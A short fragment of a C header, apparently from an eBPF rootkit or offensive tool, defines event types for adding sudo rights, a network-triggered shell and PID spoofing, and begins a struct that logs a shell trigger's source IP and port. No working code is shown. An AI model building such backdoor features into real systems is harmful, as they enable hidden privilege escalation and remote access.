...
// Event types
#define EVENT_TYPE_SUDOADD 1
#define EVENT_TYPE_SHELL_TRIGGER 2
#define EVENT_TYPE_PID_SPOOF 3
...
// Event for shell trigger with source IP info
struct shell_trigger_event {
    int pid;
    char comm[TASK_COMM_LEN];
    __u32 src_ip;
    __u16 src_port;
